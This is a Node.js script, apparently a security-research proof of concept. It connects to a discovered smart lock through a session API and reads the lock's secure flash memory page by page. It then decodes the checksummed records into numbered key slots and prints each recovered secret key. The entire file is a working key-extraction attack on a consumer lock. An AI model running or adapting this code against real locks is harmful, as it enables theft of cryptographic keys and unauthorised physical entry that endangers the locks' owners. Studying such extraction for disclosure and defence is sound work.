const lockScanner = require('./lib/lock_scanner');
const Session = require('./lib/online_session');
const util = require('util');
const delay = require('./lib/delay');
const cmd = require('./lib/command_builder');
const SecCommand = require('./lib/sec/sec_command');
const environmentConfig = require('../environment.json');
require('./lib/async_logging');

const keyMap = [
  { start: 32185, count: 1, offset: 4, initialSlot: 0, ignoreChecksum: true },
  { start: 17410, count: 99, offset: 4, initialSlot: 1 },
  { start: 17920, count: 100, offset: 0, initialSlot: 100 },
  { start: 18432, count: 57, offset: 0, initialSlot: 200 }
  ];

function extractKeys(buffer, offset, initialSlot, count, ignoreChecksum) {
  var results = [];
  for (let i = 0; i < count; i++) {
    var j = offset + i * 20;
    let expectedChecksum = (-(buffer.readInt32LE(j) + buffer.readInt32LE(j + 4)
      + buffer.readInt32LE(j + 8) + buffer.readInt32LE(j + 12))) & 0xFFFFFFFF;
    let readChecksum = buffer.readInt32LE(j + 16);

    if(expectedChecksum == readChecksum || ignoreChecksum) {
      results.push({keySlot:(initialSlot + i), key: buffer.toString('hex', j, j + 16)});
    }
  }
  return results;
}

function log(channel, data) {
  console.log(channel + ': ' + data.toString('hex'));
}

function printKeys(keys) {
  for (let i = 0; i < keys.length; i++) {
    console.log('KeySlot:' + keys[i].keySlot + ' key:' + keys[i].key);
  }
}

async function onSecResponse(session, state, data) {
  let secCmd = new SecCommand(data);
  if(secCmd.commandName == 'ResponseGetFlashPageData'){
    var i = secCmd.rawBuffer.readUInt16BE(1);
    state.buffer.write(secCmd.flashContents, (i - keyMap[state.part].start) * 8, 'hex');

    if((i-keyMap[state.part].start)*8 < 20 * (keyMap[state.part].count) + keyMap[state.part].offset/8) {
      return await session.secWrite(cmd.readSecFlash(i + 1).data);
    }

    //The current part of the keymap has been extracted
    var newResults = extractKeys(state.buffer, keyMap[state.part].offset,
      keyMap[state.part].initialSlot, keyMap[state.part].count, keyMap[state.part].ignoreChecksum);
    state.results = state.results.concat(newResults);
    printKeys(newResults);

    if(state.part++ < keyMap.length - 1) {
      state.buffer = Buffer.alloc(20 * keyMap[state.part].count + keyMap[state.part].offset + 20);
      return await session.secWrite(cmd.readSecFlash(keyMap[state.part].start).data);
    }
    await session.disconnect();
  } else {
    console.log('sec->comp', secCmd);
  }
}

async function onSessionStart(session) {
  var mapPartIndex = 0;
  var buffer = Buffer.alloc(20 * keyMap[mapPartIndex].count + keyMap[mapPartIndex].offset + 20);
  var state = { results: [], part: mapPartIndex, buffer: buffer };
  session.on('secUpdate', async d=>await onSecResponse(session, state, d));
  await session.secWrite(cmd.readSecFlash(keyMap[mapPartIndex].start).data);
}

lockScanner.on('lockFound', async lock => {
  console.log('Connected to', lock.id);

  try {
    var session = new Session(lock, environmentConfig.api);
    session.once('established', async d=>await onSessionStart(session));
    session.on('disconnect', d=>console.log('Disconnected from', lock.id))
    lock.on('error', d=>log('err', d));
    session.on('error', d=>log('err', d));
    await session.establish();
  } catch (e) {
    console.log(e);
  }
});

lockScanner.on('error', e => console.log(e));
lockScanner.start();
